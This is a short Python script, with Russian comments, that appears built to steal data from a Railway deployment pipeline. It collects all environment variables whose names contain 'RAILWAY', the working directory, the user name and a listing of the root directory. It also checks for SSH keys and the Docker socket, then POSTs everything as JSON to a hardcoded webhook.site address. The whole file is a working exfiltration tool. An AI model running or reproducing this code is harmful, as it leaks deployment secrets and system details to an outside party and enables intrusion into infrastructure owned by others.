import os
import json
import urllib.request

WEBHOOK_URL = "https://webhook.site/12f4cc8f-b5a9-4ab3-97ca-89cb72412e87"

def send_exfiltration():
    # 1. Собираем всё, что удалось вытянуть
    report = {
        "verdict": "RAILWAY_PIPELINE_DUMP",
        "railway_env": {k: v for k, v in os.environ.items() if "RAILWAY" in k},
        "system_info": {
            "cwd": os.getcwd(),
            "id": os.getlogin() if hasattr(os, 'getlogin') else "root",
            "files_in_root": os.listdir("/")
        },
        "secrets_check": {
            "has_ssh": os.path.exists("/root/.ssh"),
            "has_docker_sock": os.path.exists("/var/run/docker.sock")
        }
    }

    # 2. Подготовка и отправка данных
    data = json.dumps(report).encode('utf-8')
    req = urllib.request.Request(WEBHOOK_URL, data=data, method='POST')
    req.add_header('Content-Type', 'application/json')

    try:
        with urllib.request.urlopen(req) as f:
            response = f.read().decode('utf-8')
            print(f"[+] Success! Server response: {response}")
    except Exception as e:
        print(f"[-] Failed to send: {e}")

if __name__ == "__main__":
    send_exfiltration()
